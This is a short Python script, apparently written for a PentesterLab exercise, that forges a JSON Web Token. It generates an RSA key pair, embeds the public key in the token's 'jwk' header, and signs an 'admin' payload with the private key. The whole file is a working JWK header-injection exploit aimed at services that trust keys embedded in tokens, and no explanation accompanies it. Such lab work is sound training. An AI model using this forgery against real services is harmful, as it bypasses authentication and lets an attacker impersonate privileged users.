#!/bin/python

from Crypto.Util.number import long_to_bytes
from Crypto.Hash import SHA256
from Crypto.Signature import PKCS1_v1_5
from Crypto.PublicKey import RSA
import base64
import json

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
header, data, signature = jwt.split('.')

# openssl genrsa -out private.pem 2048
priv = RSA.importKey(open("private.pem", "rb"))
pub = priv.publickey()

e = long_to_bytes(pub.e)
e = base64.urlsafe_b64encode(e).rstrip('=')
# n = struct.pack("<I", pub.n)
n = long_to_bytes(pub.n)
n = base64.urlsafe_b64encode(n).rstrip('=')


header = {"alg": "RS256", "jwk": {"kty": "RSA", "kid" : "pentesterlab",
                                    "use": "sig", "n": n, "e": e }}

header = base64.urlsafe_b64encode(json.dumps(header)).rstrip('=')

# NOTE: -------
# string literal previx
# r''  is  //  regex in python
# ---------

# import re
# re.sub('=+$', '', str)
payload = base64.urlsafe_b64encode("admin").rstrip('=')

token = header+"."+payload

# sign
digest = SHA256.new()
digest.update(token)

signer = PKCS1_v1_5.new(priv)

signature = signer.sign(digest)
signature = base64.urlsafe_b64encode(signature).rstrip('=')
print(token+'.'+signature)
